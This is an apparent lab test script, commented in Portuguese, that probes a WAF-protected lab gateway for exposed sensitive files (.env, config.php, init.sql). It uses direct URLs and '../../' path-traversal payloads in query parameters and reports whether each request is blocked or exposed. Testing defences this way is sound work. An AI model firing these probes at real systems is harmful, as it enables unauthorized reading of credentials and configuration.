#!/usr/bin/env bash
# ============================================================
# Vulnbox Lab — Ataque: Path Traversal e Acesso a Arquivos Sensíveis (A01)
# Tenta acessar arquivos sensíveis (.env, /src/, /database/) via URL e Traversal
# ============================================================

TARGET="${TARGET:-http://owasp-lab-sentinel-gateway}"

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'
CYN='\033[0;36m'; BLD='\033[1m'; RST='\033[0m'

echo -e "\n${BLD}${CYN}════════════════════════════════════════════════${RST}"
echo -e "${BLD}  🔴 ATAQUE: Path Traversal & Arquivos Sensíveis — OWASP A01${RST}"
echo -e "${CYN}════════════════════════════════════════════════${RST}"
echo -e "  Alvo : ${TARGET}"
echo -e "${CYN}────────────────────────────────────────────────${RST}\n"

TEST_PATHS=(
    "/.env"
    "/src/config.php"
    "/src/auth.php"
    "/database/init.sql"
    "/document.php?id=../../.env"
    "/profile.php?id=../../src/config.php"
)

BLOCKED_WAF=0
EXPOSED=0

for PATH_URI in "${TEST_PATHS[@]}"; do
    RESP=$(curl -s -w "\n%{http_code}" "${TARGET}${PATH_URI}" --max-time 5 2>/dev/null)
    HTTP_CODE=$(echo "$RESP" | tail -1)
    BODY=$(echo "$RESP" | head -n -1)

    if [ "$HTTP_CODE" = "403" ]; then
        if echo "$BODY" | grep -qi "WAF\|Sentinel Gateway\|PATH_TRAVERSAL\|SENSITIVE"; then
            echo -e "  ${PATH_URI} → ${RED}HTTP 403 — BLOQUEADO PELO WAF 🛡️${RST}"
            BLOCKED_WAF=$((BLOCKED_WAF + 1))
        else
            echo -e "  ${PATH_URI} → ${GRN}HTTP 403 — Acesso negado pelo servidor ✅${RST}"
        fi
    elif [ "$HTTP_CODE" = "200" ]; then
        echo -e "  ${PATH_URI} → ${RED}HTTP 200 — VULNERÁVEL: Arquivo Exposto! ⚠️${RST}"
        EXPOSED=$((EXPOSED + 1))
    else
        echo -e "  ${PATH_URI} → HTTP ${HTTP_CODE}"
    fi
    sleep 0.3
done

echo ""
echo -e "${CYN}────────────────────────────────────────────────${RST}"
if [ $BLOCKED_WAF -gt 0 ]; then
    echo -e "  ${GRN}${BLD}RESULTADO: WAF bloqueou ${BLOCKED_WAF} tentativas (Path Traversal / Arquivos Sensíveis) 🛡️${RST}"
elif [ $EXPOSED -gt 0 ]; then
    echo -e "  ${RED}${BLD}RESULTADO: VULNERÁVEL — ${EXPOSED} recurso(s) sensível(is) exposto(s) ⚠️${RST}"
else
    echo -e "  ${GRN}${BLD}RESULTADO: Servidor/Gateway negou todos os acessos sensíveis ✅${RST}"
fi
echo -e "${CYN}════════════════════════════════════════════════${RST}\n"

